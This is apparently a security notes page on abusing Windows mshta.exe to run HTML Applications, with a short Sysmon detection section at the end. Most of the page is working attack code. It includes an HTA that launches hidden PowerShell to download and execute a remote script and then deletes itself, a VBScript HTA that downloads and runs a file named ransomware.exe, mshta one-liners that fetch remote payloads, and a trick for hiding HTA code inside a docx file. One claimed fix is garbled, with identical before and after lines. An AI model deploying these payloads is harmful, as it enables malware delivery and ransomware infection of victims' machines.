

## MSHTA

 Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) 

>  An **HTML Application (HTA)** is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as **VBScript or JScript.** 
>
> -- Wikipedia



because it runs on windows and support VBScript and Jscript, it's very obvious that it could be used in a malicious way

**The following is the format of HTA file**

```html
<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION ID="CS"
APPLICATIONNAME="Downloader"
WINDOWSTATE="minimize"
MAXIMIZEBUTTON="no"
MINIMIZEBUTTON="no"
CAPTION="no"
SHOWINTASKBAR="no">


<script>
//We will use Wscript.shell in order to launch PowerShell
// new ActiveXObject is JScript
a = new ActiveXObject('Wscript.Shell');
//Our command to execute
cmd = "powershell  -ep Bypass -nop -noexit -c (IEX (New-Object Net.WebClient).DownloadString('http://[IP]/projects/exec.ps1'))";
//Run the command, 0 is needed so that no PowerShell window will appear
a.Run(cmd,0);

//We use this in order to get erase the HTA file after it has executed
b = new ActiveXObject("Scripting.FileSystemObject");
//Get filename and edit it so that windows can read it properly
filename = window.location.href;
filename = decodeURI(filename);
filename = filename.slice(8);
//Get a handle on the file
c = b.GetFile(filename);
//Delete it
c.Delete();
//Close the MSHTA window
window.close();
</script>
</head>
<body>
</body>
</html>
```

the above HTA file uses ActiveX Microsoft extension to JavaScript to run cmd command which will run PowerShell and download another PowerShell script

the following tag is what defines that the following is HTA application so it could be parsed with mshta.exe as HTA file and execute the buried Jscript code in it



```html
<HTA:APPLICATION ID="CS"
APPLICATIONNAME="Downloader"
WINDOWSTATE="minimize"
MAXIMIZEBUTTON="no"
MINIMIZEBUTTON="no"
CAPTION="no"
SHOWINTASKBAR="no">
```

mshta.exe always looking for this tag to identify the file as HTA



to run the HTA file, *run mshta.exe from cmd not PowerShell*

```powershell
mshta.exe http://webserver/payload.hta
```

```powershell
mshta.exe [Full Path to the File]
```




mshta.exe could also run VBScript code as one-liner

```vbscript
mshta.exe vbscript:Close(MsgBox("Karem"))
```

```vbscript
mshta.exe vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

****

you also can Just VBScript
```vbscript
<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION ID="CS"
APPLICATIONNAME="Downloader"
WINDOWSTATE="minimize"
MAXIMIZEBUTTON="no"
MINIMIZEBUTTON="no"
CAPTION="no"
SHOWINTASKBAR="no">


<script type="text/vbscript" LANGUAGE="VBScript" >
Set wshShell = CreateObject( "WScript.Shell" )
strUserName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://[IP]/ransinvoke.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\"& strUserName &"\AppData\Local\Temp\ransomware.exe", 2 '//overwrite
end with
Set objShell = Wscript.CreateObject("Wscript.Shell")
objShell.run("C:\Users\"& strUserName &"\AppData\Local\Temp\ransomware.exe")

</script>
</head>
<body>
</body>
</html>
```

some times when you run the above code you get an error saying that Wscript is not defined, this is happen because of this line

```vbscript
 Set objShell = Wscript.CreateObject("Wscript.Shell")
```


 so just remove the Wscript and make it

```vbscript
Set objShell = Wscript.CreateObject("Wscript.Shell")
```
and it will run with no issue
this problem always happens to me when I run VBScript from other file, bu it works fine it the file is just VBScript and I run it through Wscrip.exe

****



**HTA file execution Tricks**

We can append the HTA file at the end of any other (not image) file

```powershell
copy /b doc.docx+file.hta newdoc.docx
mshta.exe [full path to newdoc.docx]
```

mshta.exe will not care about the extension of the supplied file as long as it's not image extension (ex: jpg, jpeg,png,..), it will just search for the tag that defines the HTA file



Notes

- if you append the data to docx file then run it using mshta.exe, it will work but once the victim opens it using word, word will identify that there is a problem but will open the file eventually after trimming the HTA code, and when user tires to close the file, word will tell hom to save the new doc which has no HTA, if the user saved the new file and removed the one that word told him that it's corrupted, then our HTA code is gone
- if you append HTA to image file and try to open it using mshta, it will open the image in a windows and will not run the JScript inside the HTA

 

### Detection

- sysmon

  - process create

    - mshta.exe process create with command line identify the file that will run the HTA
    - cmd process create with mshta.exe as parent process
    - PowerShell process that has cmd.exe as parent process 

    
    
    ![Mermaid](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/MSHTA/Misc/Mermaid.jpg)
    
    

### Reference 

[Good Resource about MSHTA] http://blog.sevagas.com/?Hacking-around-HTA-files